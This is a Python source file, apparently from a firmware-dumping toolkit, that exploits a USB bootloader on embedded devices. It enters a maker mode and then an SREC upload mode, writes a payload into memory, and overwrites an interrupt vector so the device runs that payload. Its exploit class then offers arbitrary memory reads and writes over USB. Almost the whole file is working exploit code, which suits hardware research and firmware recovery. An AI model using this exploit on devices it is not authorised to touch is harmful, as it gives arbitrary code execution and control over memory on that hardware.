import struct
import time
import usb.core
import sys

from dump.dumper import Dumper
from util.payload_builder import PayloadBuilder


def make_srec_s3(dst, data):
    payload_sz = 1 + 4 + len(data)
    assert payload_sz < 0x100

    payload = bytearray(payload_sz)
    payload[0] = payload_sz
    payload[1:5] = struct.pack(">I", dst)
    payload[5:] = data

    assert len(payload) == payload_sz

    return "S3" + payload.hex() + bytes([~(sum(payload) & 0xFF) & 0xFF]).hex()


class ShSrecExploitCommon(Dumper):

    payload_file = None

    def parse_opts(self, opts):
        super().parse_opts(opts)

        self.payload_base = opts["payload_base"]
        self.fatal_err = opts["fatal_err"]
        self.usb_interrupt = opts["usb_interrupt"]
        self.usb_getch = opts["usb_getch"]
        self.f_usb_send = opts["usb_send"]
        self.usb_send_commit = opts["usb_send_commit"]

        self.nand_data = opts.get("nand_data", 0)
        self.nand_addr = opts.get("nand_addr", 0)
        self.nand_cmd = opts.get("nand_cmd", 0)

        self.onenand_addr = opts.get("onenand_addr", 0)

    def _read_fully(self, sz):
        data = b""
        while len(data) < sz:
            data += self.dev.read(0x82, 512)
        if sz != len(data):
            print("_read_fully: requested={} got={}".format(sz, len(data)))
            print("data dump => {}".format(data.hex()))
        assert len(data) == sz
        return data

    def execute(self, dev, output):
        self.output = output

        print("Enter maker mode...")

        # validate support for mode =0xC0
        data = bytearray(dev.ctrl_transfer(0x41, 0x62, 0x00, 0, b"\x02\xC0"))
        dev.read(0x81, 256)

        # set ep to mode 0xC0
        dev.ctrl_transfer(0x41, 0x60, 0xC0, 0)
        dev.read(0x81, 256)

        # enter maker mode
        dev.write(3, bytes.fromhex("FF 56 55 42 00 03 C1 01 00 FE"))

        time.sleep(0.5)

        print("Enter srec mode...")
        dev.write(3, bytes.fromhex("FF 55 56 42 00 01 01 FE"))

        time.sleep(0.5)

        while True:
            dev = None
            for pid in [0x0033, 0x0035, 0x004c]:
                dev = usb.core.find(idVendor=0x045b, idProduct=pid)
                if dev is not None:
                    break

            if dev is None:
                print("Waiting for srec mode...")
                time.sleep(1)
            else:
                break

        print("Got srec mode, exploiting...", end="")
        sys.stdout.flush()

        self.dev = dev

        dev.ctrl_transfer(0x41, 0x62, 0x00, 0, b"\x02\xC0")
        dev.ctrl_transfer(0x41, 0x60, 0xC0, 0)
        handshake = bytearray(dev.read(0x82, 4096))
        assert handshake == bytes.fromhex("4442800000000008")

        payload = PayloadBuilder(self.payload_file).build(
            base=self.payload_base,
            fatal_err=self.fatal_err,
            usb_interrupt=self.usb_interrupt,
            usb_getch=self.usb_getch,
            usb_send=self.f_usb_send,
            usb_send_commit=self.usb_send_commit,
            nand_data=self.nand_data,
            nand_cmd=self.nand_cmd,
            nand_addr=self.nand_addr,
            onenand_addr=self.onenand_addr,
        )

        # align to 256k to cache burst
        payload += b"\x00" * (256 * 1024 - len(payload))

        for x in range(0, len(payload), 0x80):
            data = make_srec_s3(self.payload_base + x, payload[x:x+0x80])
            assert dev.write(3, data) == len(data)

        dev.write(3, make_srec_s3(0xFFFFFFFF, b"\xFF" + b"\x00" * 0x18 + struct.pack("<III", 0xe59ff000, 0xdeadbeef, self.payload_base)))

        # give a chance for our overwritten interrupt to hit
        for x in range(300):
            if x % 30 == 0:
                sys.stdout.write("..")
                sys.stdout.flush()
            dev.ctrl_transfer(0x80, 0x06, 0x0100, 0x00, 0x40)
            time.sleep(0.01)
        print("")

        # trigger jump to the runner payload
        dev.write(3, b"\xAA")

        # now communicating with out payload, check handshake
        dev.write(3, b"\x42")
        data = bytearray(self._read_fully(1))
        assert data == b"\x43"

        print("Exploit OK!")


class ShSrecExploit(ShSrecExploitCommon):

    payload_file = "sh_rw.c"

    def readb(self, addr):
        self.dev.write(3, struct.pack("<BI", 0x10, addr))
        return struct.unpack("B", self._read_fully(1))[0]

    def readh(self, addr):
        self.dev.write(3, struct.pack("<BI", 0x11, addr))
        return struct.unpack("<H", self._read_fully(2))[0]

    def readw(self, addr):
        self.dev.write(3, struct.pack("<BI", 0x12, addr))
        return struct.unpack("<I", self._read_fully(4))[0]

    def writeb(self, val, addr):
        self.dev.write(3, struct.pack("<BIB", 0x20, addr, val))

    def writeh(self, val, addr):
        self.dev.write(3, struct.pack("<BIH", 0x21, addr, val))

    def writew(self, val, addr):
        self.dev.write(3, struct.pack("<BII", 0x22, addr, val))

    def read64(self, addr):
        self.dev.write(3, struct.pack("<BI", 0x60, addr))
        return self._read_fully(64)

    def read512(self, addr):
        self.dev.write(3, struct.pack("<BI", 0x61, addr))
        return self._read_fully(512)

    def read(self, addr, size):
        assert size % 64 == 0

        data = b""
        while size > 0:
            data += self.read64(addr)
            addr += 64
            size -= 64
        return data
